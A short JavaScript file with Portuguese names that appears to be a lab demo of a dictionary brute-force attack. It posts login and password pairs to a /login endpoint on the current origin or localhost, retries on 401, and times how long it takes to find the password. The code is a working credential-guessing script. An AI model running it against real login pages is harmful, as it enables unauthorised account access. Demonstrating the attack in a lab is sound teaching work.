adicionarSenha(0,'admin');  //Inicio
// adicionarSenha(1,'admin');  //Meio
// adicionarSenha(2,'admin');  //Fim

const dicionario = {
    logins: ['admin'],
    senhas: senhas
};

let data = {};
let times = {
    start: Date.now(),
    end: 0
}

const url =  window.location.origin || 'http://localhost:4343';
const urlAlvo = `${url}/login`;

let login = 0, pwd = 0;
let count = 0;
sendAjax();
function sendAjax() {
    count++;
    data.login = dicionario.logins[login];
    data.senha = dicionario.senhas[pwd];
    console.log(`Tentativa nº ${count} :::: Testando senha: '${data.senha}'  `);
    $.ajax({
        url: urlAlvo,
        type: 'POST',
        data: JSON.stringify(data),
        dataType: "json",
        contentType: "application/json; charset=utf-8",
        statusCode: {
            200: () => {
                let user = {};
                user.login = dicionario.logins[login];
                user.senha = dicionario.senhas[pwd];
                endFB({user});
            },
            401: () => {
                if (login+1 >= dicionario.logins.length && pwd+1 >= dicionario.senhas.length) {
                    endFB({user:"Não encontrado"});
                } else {
                    if (++login >= dicionario.logins.length) {
                        login = 0;
                        if (++pwd >= dicionario.senhas.length) {
                            pwd = 0;
                        }
                    }
                    sendAjax();
                }
            }
        }
    });
}

function endFB(user) {
    console.log({ loginEncontrado: user });
    times.end = Date.now();
    console.log('Milissegundos para quebrar a senha:',times.end-times.start);
}